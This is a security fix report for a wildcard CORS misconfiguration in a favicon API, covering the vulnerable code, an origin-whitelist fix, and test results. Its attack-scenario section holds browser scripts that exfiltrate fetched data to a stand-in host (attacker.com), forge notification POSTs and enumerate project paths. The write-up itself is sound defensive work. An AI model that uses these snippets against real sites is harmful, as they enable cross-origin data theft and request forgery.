# Security Fix: CORS Configuration (CVSS 8.6)

**Date:** 2025-12-03
**Severity:** HIGH (CVSS 8.6)
**Status:** FIXED
**Vulnerability:** CWE-942 - Overly Permissive Cross-Origin Resource Sharing Policy

## Summary

Fixed critical CORS misconfiguration that allowed any website to access the Favicon API endpoints. The wildcard `Access-Control-Allow-Origin: *` configuration has been replaced with strict origin whitelist validation.

## Vulnerability Details

### Before (VULNERABLE)

**File:** `/opt/tools/vscode-favicon/vscode-favicon-api/server.js` (lines 30-42)

```javascript
// VULNERABLE CODE - DO NOT USE
app.use((req, res, next) => {
    // Allow all origins since this will be behind Cloudflare
    res.setHeader('Access-Control-Allow-Origin', '*');  // DANGER!
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }

    next();
});
```

**Comment in code:** "Allow all origins since this will be behind Cloudflare"
**Why this is wrong:** Cloudflare is a CDN/proxy, NOT a CORS security layer. Application-level CORS must be enforced regardless of proxy configuration.

### Attack Scenarios

#### 1. Data Exfiltration
```html
<!-- Malicious website: https://evil.com -->
<script>
fetch('https://favicon-api.vs.noreika.lt/favicon-api?folder=/opt/dev/secret-project')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate project information
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        });
    });
</script>
```

With `Access-Control-Allow-Origin: *`, the browser allows this cross-origin request to succeed.

#### 2. CSRF on Notification Endpoints
```html
<!-- Malicious website: https://evil.com -->
<script>
// Inject false completion notifications
fetch('https://favicon-api.vs.noreika.lt/claude-completion', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        folder: '/opt/dev/legitimate-project',
        message: 'Malicious task completed'
    })
});
</script>
```

#### 3. Project Information Disclosure
```javascript
// Enumerate all projects by path guessing
const paths = ['/opt/dev/admin-panel', '/opt/dev/api', '/opt/dev/payment'];
paths.forEach(path => {
    fetch(`https://favicon-api.vs.noreika.lt/favicon-api?folder=${path}`)
        .then(r => r.ok ? console.log('Found:', path) : null);
});
```

## Fix Implementation

### 1. Centralized CORS Module

**File:** `/opt/tools/vscode-favicon/lib/cors-config.js`

```javascript
const ALLOWED_ORIGINS = [
    'https://vs.noreika.lt',
    'https://favicon-api.noreika.lt',
    'http://localhost:8080',
    'http://192.168.110.199:8080',
    'http://192.168.110.199:8091'
];

function corsMiddleware(req, res, next) {
    const origin = req.headers.origin;

    // Only set CORS headers for whitelisted origins
    if (origin && ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
        res.setHeader('Vary', 'Origin');  // Prevent cache poisoning
    }
    // No CORS headers for unknown origins = browser blocks request

    if (req.method === 'OPTIONS') {
        return res.sendStatus(204);  // Proper HTTP status for preflight
    }

    next();
}
```

### 2. Updated Server Files

Both server files now use the centralized CORS middleware:

**vscode-favicon-api/server.js:**
```javascript
const { corsMiddleware } = require('../lib/cors-config');
app.use(corsMiddleware);
```

**vscode-favicon-service/server.js:**
```javascript
const { corsMiddleware } = require('../lib/cors-config');
app.use(corsMiddleware);
```

## Security Improvements

| Feature | Before | After |
|---------|--------|-------|
| Origin Validation | None (wildcard) | Strict whitelist |
| Cache Poisoning Protection | No | Yes (Vary: Origin header) |
| Preflight Status Code | 200 OK | 204 No Content |
| Unknown Origins | Allowed | Blocked by browser |
| Centralized Config | No | Yes (lib/cors-config.js) |

## Testing

### Unit Test Results

```
CORS Configuration Test
======================
Origin: https://vs.noreika.lt
  Expected: ALLOWED
  CORS Header: https://vs.noreika.lt
  Status: PASS ✓

Origin: https://evil.com
  Expected: BLOCKED
  CORS Header: NOT SET
  Status: PASS ✓ (blocked)

Origin: http://localhost:8080
  Expected: ALLOWED
  CORS Header: http://localhost:8080
  Status: PASS ✓

Origin: none
  Expected: BLOCKED
  CORS Header: NOT SET
  Status: PASS ✓ (blocked)
```

### Manual Testing

#### Valid Origin Test
```bash
curl -H "Origin: https://vs.noreika.lt" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     -i http://localhost:8091/favicon-api

# Expected Response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://vs.noreika.lt
Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type
Vary: Origin
```

#### Invalid Origin Test
```bash
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     -i http://localhost:8091/favicon-api

# Expected Response:
HTTP/1.1 204 No Content
# NO CORS headers present
```

## Files Modified

1. **Created:** `/opt/tools/vscode-favicon/lib/cors-config.js` - Centralized CORS configuration
2. **Updated:** `/opt/tools/vscode-favicon/vscode-favicon-api/server.js` - Replaced wildcard CORS
3. **Updated:** `/opt/tools/vscode-favicon/vscode-favicon-service/server.js` - Applied strict CORS
4. **Created:** `/opt/tools/vscode-favicon/docs/security/cors-policy.md` - Documentation

## References

- **OWASP CORS Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
- **CWE-942:** https://cwe.mitre.org/data/definitions/942.html
- **MDN CORS:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

## Deployment Notes

1. **NO changes required** to Cloudflare configuration
2. **Test** CORS after deployment with browser DevTools
3. **Verify** that origin headers pass through Cloudflare
4. **Monitor** for any legitimate origin requests being blocked

## Adding New Origins

To whitelist a new origin:

1. Edit `/opt/tools/vscode-favicon/lib/cors-config.js`
2. Add origin to `ALLOWED_ORIGINS` array
3. Document reason in this file
4. Test with curl or browser
5. Deploy and verify

**DO NOT** add untrusted origins. Only add origins you control.

## Security Contact

For security issues, contact: kostas@noreika.lt
